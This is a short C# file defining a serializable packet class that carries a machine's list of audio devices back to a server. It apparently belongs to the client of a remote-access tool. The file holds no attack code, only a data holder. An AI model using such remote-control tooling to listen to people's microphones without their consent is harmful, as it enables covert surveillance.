using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using xClient.Core.Networking;
using xClient.Core.Utilities;

namespace xClient.Core.Packets.ClientPackets {

    [Serializable]
    public class GetAudioDevicesResponse : IPacket {

        public Dictionary<string, int> AudioDevices { get; set; }

        public GetAudioDevicesResponse() {
            
        }

        public GetAudioDevicesResponse(Dictionary<string, int> audioDevices) {
            AudioDevices = audioDevices;
        }

        public void Execute(Client client) {
            client.Send(this);
        }
    }
}
